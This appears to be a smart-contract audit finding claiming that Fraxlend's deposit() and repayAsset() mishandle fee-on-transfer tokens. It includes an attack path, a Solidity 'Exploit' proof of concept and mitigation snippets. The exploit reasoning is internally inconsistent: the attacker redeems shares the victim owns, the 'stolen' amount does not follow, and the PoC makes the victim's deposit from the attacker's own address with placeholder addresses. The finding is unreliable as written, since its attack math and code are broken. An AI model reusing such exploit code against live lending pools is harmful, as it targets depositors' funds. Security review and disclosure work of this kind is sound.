# Critical Accounting Error Due to Fee-on-Transfer Token Handling

### Summary

Fraxlend’s deposit() and repayAsset() functions do not account for ERC-20 tokens with transfer fees, leading to inflated shares and undercollateralized loans. Attackers can exploit this to drain protocol assets or evade debt repayment.

**Missing Balance Checks:**

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/fraxlend/src/contracts/FraxlendPairCore.sol#L578-L610
**Issue:** The code mints shares based on _amount, not the actual received tokens.

**Same Issue in repayAsset():**
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/fraxlend/src/contracts/FraxlendPairCore.sol#L1023-L1052
**Issue:** Debt is reduced by _amountToRepay, ignoring transfer fees.

### Root Cause

**Lack of Balance Checks:**
Functions like deposit() and repayAsset() calculate shares/debt based on the sent amount (_amount), not the received amount after fees.

**Assumption of Standard ERC-20 Compliance:**
The protocol assumes all tokens have no transfer fees, violating ERC-20’s optional fee flexibility.

### Internal Pre-conditions

Protocol allows fee-on-transfer tokens (not explicitly blacklisted).

Users can deposit/repay with arbitrary ERC-20 tokens.

### External Pre-conditions

Attacker uses a token with transfer fees (e.g., STA).

### Attack Path

**Seed the Pool:** 
A victim deposits 100 tokens (no fee), creating a baseline of 100 assets and 100 shares.

**Attacker Deposits:** 
Deposits 100 tokens (2% fee → 98 received).
 Total assets = 198, shares = 200.

**Redeem Shares:** 
Attacker redeems 200 shares → 198 tokens (98 stolen from victim).

### Impact

1. Protocol Insolvency: Attackers drain liquidity by exploiting inflated shares.

2. Debt Evasion: Borrowers repay less than owed, leaving loans undercollateralized.

### PoC

```solidity
// Exploit: Steal funds via fee-on-transfer token deposits
contract Exploit {
    IERC20 feeToken = IERC20(0xSTA...); // Token with 2% fee
    FraxlendPair pair = FraxlendPair(0x...);

    function attack() external {
        // Step 1: Seed the pool with initial liquidity (e.g., from a victim)
        feeToken.transfer(address(pair), 100e18);
        pair.deposit(100e18, address(this)); // Victim deposits 100 tokens

        // Step 2: Attacker deposits 100 tokens (protocol receives 98)
        feeToken.approve(address(pair), 100e18);
        pair.deposit(100e18, address(this)); // Mints shares for 100 tokens

        // Step 3: Redeem all shares (198 tokens total)
        pair.redeem(pair.balanceOf(address(this)), address(this), address(this));
    }
}
```

### Mitigation

1. Track Received Tokens:
```solidity
function _deposit(...) internal {
    uint256 balanceBefore = assetContract.balanceOf(address(this));
    assetContract.safeTransferFrom(msg.sender, address(this), _amount);
    uint256 received = assetContract.balanceOf(address(this)) - balanceBefore;
    _sharesReceived = _totalAsset.toShares(received, false);
}
```
2. Whitelist Compliant Tokens:
Use a factory pattern to deploy pairs only for tokens without fees.

3. Add Fee Detection:
```solidity
function isFeeOnTransfer(address token) external returns (bool) {
    uint256 balanceBefore = IERC20(token).balanceOf(address(this));
    IERC20(token).safeTransferFrom(msg.sender, address(this), 1e18);
    uint256 balanceAfter = IERC20(token).balanceOf(address(this));
    return (balanceAfter - balanceBefore) < 1e18;
}
```
